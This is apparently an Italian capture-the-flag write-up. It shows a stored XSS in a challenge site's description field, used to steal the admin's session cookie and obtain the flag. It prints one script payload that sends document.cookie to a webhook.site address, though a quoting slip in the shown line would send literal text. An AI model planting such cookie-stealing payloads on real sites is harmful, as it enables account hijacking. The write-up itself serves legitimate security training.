Il sito ci da la possibilità di registrarci, inseriamo username e password qualsiasi e ci accediamo

<img width="1370" height="487" alt="immagine" src="https://github.com/user-attachments/assets/4df6b353-ca9c-46bc-af25-b7dda0d48027" />

Ci ritroviamo in questa pagina apparentemente innocua, infatti in realtà il campo description è vulnerabile a xss, possiamo verificarlo con un semplice alert:

<img width="1156" height="442" alt="immagine" src="https://github.com/user-attachments/assets/8c92ff19-bf92-4193-9f3a-3583152cfa83" />

<img width="1190" height="522" alt="immagine" src="https://github.com/user-attachments/assets/4710dc3c-dd06-4ad1-99ce-17ff60b2711f" />

Inseriamo allora il payload per rubare il cookie all'admin:

```<script>fetch("https://webhook.site/00a9f704-b8e6-454d-bec3-41073d65b205/?c= +document.cookie");</script>```

Inseriamo poi nella sezione Report a bug l'url della pagina, e attendiamo che il cookie arrivi sul webhook.

Una volta preso, lo inseriamo al posto del nostro tramite i devtools.

<img width="1188" height="455" alt="immagine" src="https://github.com/user-attachments/assets/f4d7afc6-8d09-4491-91b4-80af5eac5ed0" />




**flag{c00ki3s_4r3_d4Ng3r0uS_Wh3n_Th3y_m33t_XSS}**
